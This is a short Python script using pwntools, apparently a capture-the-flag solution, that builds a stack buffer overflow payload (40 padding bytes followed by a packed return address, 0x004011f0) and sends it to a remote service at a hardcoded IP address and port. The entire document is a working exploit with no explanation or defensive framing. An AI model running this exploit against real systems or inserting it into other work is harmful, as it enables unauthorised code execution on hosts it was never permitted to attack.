#!/usr/bin/python3
from pwn import *
import struct
addr = 0x004011f0
padd = b'a' * 40
payload = padd + struct.pack('I', addr)
target = remote('3.142.83.254', 1234)
print(target.recv())
print(payload, addr)
print(target.sendline(payload))
print(target.recv())
